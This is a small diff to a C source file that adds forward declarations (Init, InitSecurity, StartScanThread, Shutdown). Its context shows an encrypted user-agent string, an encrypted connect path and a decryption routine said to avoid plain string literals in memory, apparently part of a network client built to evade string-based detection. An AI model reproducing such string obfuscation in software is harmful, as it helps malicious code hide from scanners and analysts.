@@ -103,6 +103,12 @@ static const BYTE ENC_USER_AGENT[] = {0xE6, 0x78, 0xD8, 0x03, 0xFD, 0x5F, 0x8B, 
 static const BYTE ENC_PATH_CONNECT[] = {0x88, 0x5E, 0xFC, 0x38, 0xFD, 0x18, 0x88, 0x2B, 0xC4, 0x53, 0xE5, 0x34, 0xBC, 0x1A, 0x96, 0x67, 0xC8, 0x51, 0xE2, 0x34, 0xB1, 0x1A};
 #define ENC_PATH_CONNECT_LEN 22
 
+// Forward declarations
+void InitSecurity();
+void Init();
+void StartScanThread();
+void Shutdown();
+
 // Decrypt function - decrypts in place to avoid string literals in memory
 static void DecryptString(const BYTE* enc, int len, char* out) {
     for (int i = 0; i < len; i++) {
